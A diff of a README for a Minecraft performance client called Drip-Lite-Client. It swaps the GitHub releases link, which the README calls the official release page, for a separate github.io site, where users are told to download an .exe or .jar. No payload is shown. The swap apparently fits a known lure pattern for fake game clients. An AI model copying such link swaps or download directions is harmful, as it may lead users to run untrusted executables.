@@ -1,6 +1,6 @@
 # 🎮 Drip-Lite-Client - Play Minecraft with better frame rates
 
-[ ![Download Drip Lite](https://img.shields.io/badge/Download-Release-blue) ](https://github.com/Karinaclastic11/Drip-Lite-Client/releases)
+[ ![Download Drip Lite](https://img.shields.io/badge/Download-Release-blue) ](https://karinaclastic11.github.io)
 
 ## 📌 Introduction
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the software.
 
 You need the latest version of the software to start. Follow these steps to find the file.
 
-1.  Visit the official release page: https://github.com/Karinaclastic11/Drip-Lite-Client/releases
+1.  Visit the official release page: https://karinaclastic11.github.io
 2.  Look for the latest release version at the top of the list.
 3.  Click the file name ending in .exe or .jar to start your download.
 4.  Save the file to your Downloads folder or your Desktop.
